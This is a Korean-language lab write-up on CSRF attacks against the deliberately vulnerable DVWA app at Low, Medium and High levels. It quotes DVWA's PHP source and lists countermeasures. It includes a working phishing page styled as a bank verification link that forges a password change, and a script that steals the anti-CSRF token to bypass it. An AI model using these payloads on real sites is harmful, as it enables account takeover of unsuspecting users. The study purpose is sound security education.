## CSRF 공격(사이트간 요청 위조 공격)

### 개요

본 Writeup은 그루트 시큐리티 웹 해킹 0기 스터디 3주차 CSRF 공격(사이트간 요청 위조)에 대한 Writeup으로 아래 설명하는 모든 공부 및 실습은 VirtualBox - Kali Linux 가상머신에서 DVWA 취약한 웹 환경을 구성하여 이루어졌다.

### 목차

이번 Writeup 에서 진행하는 CSRF 공격과 관련된 공부는 다음과 같다.
1. 취약점 설명 - CSRF 공격에 대한 연구, 쿠키와 세션에 대한 설명
2. 개념 증명 실습 - DVWA Security Level(Low, Midium, High)로 구성된 피싱사이트 유도 및 악성 스크립트 실행 실습 진행
3. 대응방안 - CSRF 공격에 대한 대응 방안
4. 레퍼런스

### 취약점 설명

CSRF 공격(사이트간 요청 위조)은 웹 어플리케이션의 취약점 중 하나로 사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위(데이터 변조, 삭제, 생성 등)을 특정 웹 사이트에 요청하게 만드는 공격이다. 주로 Email, 게시판 등에서 링크를 통해 피싱하여 사용자 정보를 탈취하거나 변경하는데 사용된다.

#### - 쿠키와 세션

우선 CSRF 공격을 이해하기 위해서는 쿠키와 세션에 대한 이해가 필요하다. 사용자가 웹 서버에 접속하여 요청을 보낼 때 다음과 같은 작업들이 수행된다.

1. 사용자가 웹 서버에 로그인할 때 사용자가 사용하는 클라이언트(브라우저)는 서버에 요청을 보내게된다. 
2. 이에 서버는 로그인 요청이 들어오면 DB서버에서 사용자의 권한을 조회하고 사용자 정보를 세션ID를 생성하여 메모리에 저장한다. 
3. 서버가 저장된 세션 정보를 클라이언트(브라우저)가 알 수 있도록 세션ID를 Set-Cookie 헤더에 담아서 전달하고 클라이언트(브라우저)는 전달된 세션ID를 쿠키에 저장한다. 
4. 클라이언트(브라우저)는 사용자가 요청하는 모든 데이터를 요청할 때 쿠키에 저장된 세션ID를 포함하여 응답하게 된다. 
5. 사용자가 웹 서버에 또 다른 요청을 보낼 때 전달받은 쿠키에 담긴 세션ID를 통해 인증된 사용자인지 여부를 확인하고 요청을 처리한다. (웹 서버마다 주고받는 쿠키값은 다르며 웹 서버가 지정해놓은 시간 동안만 유효하다.)

#### - CSRF 공격 시나리오 설명

1. 사용자가 특정 웹 사이트에 로그인하여 접속한다.
2. 사용자가 로그인 후 패스워드 변경 시 웹 서버에 전달되는 HTTP 요청을 가로챈 뒤 쿠키값을 탈취한다.
3. 공격자는 본인이 만든 악성 스크립트가 포함된 페이지 링크를 사용자에게 email로 전송하고 속여 공격자의 스크립트가 수행되도록 유도한다.
4. 사용자가 링크를 클릭할 때 공격자가 의도한 패스워드로 요청을 변조하여 서버에 전달한다.
5. 서버는 쿠키값이 담긴 세션ID를 비교하여 인증된 사용자로부터 온 것인지 판단하고 요청을 처리한다.
6. 공격자는 의도한대로 패스워드를 변경하고 인증에 성공한다. (사용자 계정 탈취 성공)

### 개념 증명

#### * Low Level

취약한 DVWA 웹 환경(Low Level)에서 CSRF 공격 실습을 진행해보았다. 먼저 사용자가 웹 서버에 패스워드 변경을 Burpsuite을 통해 GET 요청을 가로채어 확인해보았다.

![이미지](/assets/intercept.png)

사용자가 Get Method로 패스워드 변경 요청을 진행했을 때, 요청 시 사용자가 작성한 패스워드 정보가 URL에 표시되는 것을 확인할 수 있었다. 

![이미지](/assets/passwordchange_url2.png)

공격자는 URL에 표시되는 Get 요청에 포함된 패스워드 값을 변조하여 웹 서버에 전달할 경우 공격자가 의도한대로 패스워드가 변조되는 것을 확인하였다. 위 시나리오처럼 CSRF 공격을 수행하기 위해 공격자가 피싱사이트에 업로드 할 악성 스크립트를 아래와 같이 작성해보았다.

```javascript
<html>
<meta charset="UTF-8"
<head>
</head>
<script language="javascript">
	function attack(){
		var host = "localhost";
		var req="http://localhost/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"; 
        //웹 서버에 요청을 위조하여 hacked 값으로 패스워드를 변경
		
		var xmlHttpRequest = new XMLHttpRequest();
		
		xmlHttpRequest.open("GET", req, true);
		xmlHttpRequest.withCredentials = "true";

		xmlHttpRequest.send();
	
		alert("Thank you for your support! Your Account is mine"); 
        //링크를 클릭했을 때의 알림창
	}
</script>
<body>
	<h1>GrootBank Verification Page</h1>
	<div>
	Click this <a href="javascript:attack()">link</a> for verification.
	</div>
</body>
</html>
```

사용자가 웹 서버에 인증을 하였고 브라우저에 서버에서 전달받은 세션ID값을 저장한 상태라고 가정하였다. 이후 사용자가 공격자의 피싱 사이트에서 악의적인 스크립트 실행으로 인해 `http://localhost/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change` 이와 같은 요청으로 변조되어 전달 된다면 서버를 속이고 요청 위조 공격에 성공하여 공격자의 의도대로 패스워드를 변경할 수 있을 것이다.

#### - 피싱사이트 접속 유도

![이미지](/assets/email확인.png)

![이미지](/assets/피싱링크유도.png)

#### - 사용자 악성 스크립트 클릭 유도

![이미지](/assets/링크클릭.png)

공격자는 은행 사이트의 계정 보안강화를 위해 악성 스크립트를 클릭할 수 있도록 유도 하였다. 일반 사용자 입장에서는 URL 클릭 후 계정 보안이 강화 되었다고 생각할 것이다. 그 이후 DVWA 페이지에 사용자 계정 및 패스워드를 입력했을 때 공격자의 패스워드 변경 악성 스크립트로 인해 공격자가 패스워드 변조 공격에 성공한 것을 확인하였다.

#### - CSRF 공격 성공 (사용자 계정 탈취 성공)

![이미지](/assets/로그인실패.png)

사용자가 공격자의 피싱사이트에서 링크를 클릭했을 때의 요청을 Burpsuite를 통해 Proxy서버로 확인하고 이 전과 비교해보았다.

#### - 스크립트 수행 시 요청
![이미지](/assets/hacked_intercept.png)

#### - 스크립트 수행 시 요청
![이미지](/assets/compared_intercept.png)

정상적인 요청과 CSRF공격을 통한 요청을 비교해 보았을 때 웹 서버에 저장된 SessionID 값이 일치하여 웹 서버는 정상적인 요청으로 간주하고 패스워드를 성공적으로 변경한 것을 확인하였다. (실제 다른 SessionID 값을 가지고 공격을 수행했을 때 CSRF 공격에 실패한 것을 확인하였다.)

위와 같이 쿠키 값이 서로 동일 하였고, 웹 서버는 공격자의 요청이 정상적인 요청으로 확인하여 변경된 패스워드를 DB서버에 전달했을 것이다.

#### * 소스코드 확인(Low)
```c
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```

#### * Midium Level

Midium Level에서는 소스코드를 먼저 확인 해보았다.

#### * 소스코드 확인(Midium)
```c
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) { //Referer Header 값을 확인하여 다른 URL에서 요청이 올 경우 패스워드 변경을 스킵한다.
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];

        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update the database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for the user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with passwords matching
            echo "<pre>Passwords did not match.</pre>";
        }
    }
    else {
        // Didn't come from a trusted source
        echo "<pre>That request didn't look correct.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```

Midium Level의 소스코드를 바로 확인해보았다. `stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER['SERVER_NAME' ]) !== false` 해당 소스코드에서 HTTP 요청 시 Referer 헤더를 포함하여 어떤 웹 서버(URL 경로)에서 요청된 것인지 웹 페이지의 주소값을 검증하는 소스코드를 통해 CSRF 공격을 방지하였다. 예를 들어, 공격자의 URL이 'localhost/csrfattack\.html'이 아닌 '172.17.0.1/csrfhtmlattack.html' 이라고 가정했을 때 웹 서버의 URL에 localhost가 포함되어 있지 않다면 다른 웹 서버 주소로 간주하여 요청을 무시하는 것이다. 이 처럼 공격자가 CSRF 공격을 수행할 때 공격자의 피싱 사이트 주소가 Refer에 설정되고, 해당 Referer 값을 비교함으로서 사용자가 정상적인 경로를 통해 요청한 것인지 구분하여 방지할 수 있다.

하지만 공격파일 이름에 실제 공격 대상의 웹 서버 주소를 포함하여 경로를 지정하고 공격을 수행할 경우에는 여전히 우회할 수 있다. (`Low Level` 단계에서 공격자 웹 서버 주소를 localhost/csrfattack.html로 공격 실습을 하여 우회에 성공하였기 때문에 생략하였다.)

#### * High Level

위와 같이 피싱 사이트 링크를 통해 웹 서버에 요청을 변조하는 공격을 수행하였을 때 공격이 정상적으로 수행되지 않은 것을 확인하였다.

사용자가 패스워드 변경 요청을 서버에 전달하였을 때 Burpsuite을 통해 HTTP 요청을 확인해보았다. 

![이미지](/assets/csrf_token.png)

![이미지](/assets/csrf_token2.png)

사용자가 GET 요청을 보낼 때 `user_token`값을 같이 포함하여 보내고 있으며, 해당 `토큰값(user_token)'이 계속해서 랜덤으로 변경되는 것을 확인할 수 있었다. 토큰값을 통해 어떻게 방지하고 있는 것인지 소스코드를 확인해보았다.

#### * 소스코드 확인(High)

```c
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

High Level의 소스코드를 확인해보면 `checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );` CSRF 토큰값(`user_token`)과 세션 토큰값(`session_token`)을 비교하여 일치 여부를 확인하는 것을 알 수 있다.

#### - CSRF 토큰이란?
웹 어플리케이션에서 발생하는 CSRF 공격을 방지하기 위해 CSRF 토큰을 통해 요청이 사용자가 전송한 것이 맞는지 검증하거나 재인증을 요청하는 등의 조치를 위해 생긴 것이다. 토큰값은 서버측 어플리케이션에서 임의의 난수를 생성하고 세션에 저장하여 사용자가 요청할 때마다 해당 난수 값을 포함시켜서 전송시키는 것이다. 토큰값은 서버와 클라이언트가 공유하는 예측할 수 없는 고유 비밀 값이다. 따라서 웹 서버는 사용자의 요청을 확인할 때마다 세션에 저장된 토큰값과 요청 파라미터에 전달된 토큰값이 동일한지 비교하여 동일하다면 사용자의 정상적인 요청으로 간주하고 응답하는 것이다. 

사용자가 패스워드 변경 요청을 보낼 때 생성되는 `user_token`을 Burpsuite를 통해 일부 변경하여 Foward 클릭 후 요청을 변조해보았다.

![이미지](/assets/token_incorrect.png)

CSRF 토큰을 변조하여 요청할 경우 웹 서버가 가지고 있는 CSRF 토큰 값과 일치하지 않아 `CSRF token is incorrect` 메시지가 뜨며 패스워드 변경 공격에 실패한 것을 확인할 수 있었다. 랜덤으로 변하는 CSRF 토큰값으로 공격자가 유추하기 쉽지 않은 값으로 시큐어코딩을 통해 CSRF 공격을 방지하였다.

하지만 이 경우에도 공격자가 서버에서 자동으로 토큰을 가져온 다음 그 토큰을 이용하여 요청하는 우회 공격을 통해 CSRF 공격을 수행할 수 있었다.

```c
var xhr;
var dvwa_csrf_url = '/localhost/vulnerabilities/csrf/';
request1();

function request1() {
        xhr = new XMLHttpRequest();

        xhr.onreadystatechange = request2;
        xhr.open('GET', dvwa_csrf_url);
        xhr.send();
}

function request2() {
        if (xhr.readyState === 4 && xhr.status === 200) {
                var htmltext = xhr.responseText;
                var parser = new DOMParser();
                var htmldoc = parser.parseFromString(htmltext,'text/html');

                var CSRFtoken = htmldoc.getElementsByName("user_token")[0].value;
                alert('Found the token: ' + CSRFtoken);

                xhr = new XMLHttpRequest();
                xhr.open('GET', dvwa_csrf_url + '?password_new=hacked&password_conf=hacked&Change=Change&user_token=' + CSRFtoken);
                xhr.send();

        }

}
```

요청을 두 번 보내게 된다. DVWA에서 CSRF 메뉴를 누를 때 발생하는 요청 request 함수 내에서 user_token을 알아내고 알아낸 토큰을 두 번째 요청에 포함하여 보낸다. 우회가 가능하다.
공격자가 생성한 악성 스크립트를 Stored XSS공격(취약한 웹 서버에 악성 스크립트를 저장(Stored)하고, 피해자가 서버에 접속할 경우 스크립트 자동 실행이 가능한 공격)이 가능한 취약한 웹 페이지에서 업로드를 하여 CSRF 공격이 가능한지 확인해보았다.

![이미지](/assets/XSStest.png)


### 취약점 원인

### 대응 방안

1. Referer 체크
2. GET/POST 요청 구분
3. 토큰 사용
   - 요즘 웹 서버는 CSRF 공격을 방지하기 위해 CSRF 토큰 방식을 필수로 사용하고 있다. CSRF의 취약성은 일반적으로 CSRF 토큰의 검증 결함으로 발생한다고도 한다.

4. 추가 인증 수단 사용 (ex. (re)CAPCHA)

### 레퍼런스
1. CSRF 공격에 대한 설명 : [https://ko.wikipedia.org/wiki/%EC%82%AC%EC%9D%B4%ED%8A%B8_%EA%B0%84_%EC%9A%94%EC%B2%AD_%EC%9C%84%EC%A1%B0](https://ko.wikipedia.org/wiki/%EC%82%AC%EC%9D%B4%ED%8A%B8_%EA%B0%84_%EC%9A%94%EC%B2%AD_%EC%9C%84%EC%A1%B0)
2. CSRF Token에 대한 설명 : [https://portswigger.net/web-security/csrf/tokens](https://portswigger.net/web-security/csrf/tokens)

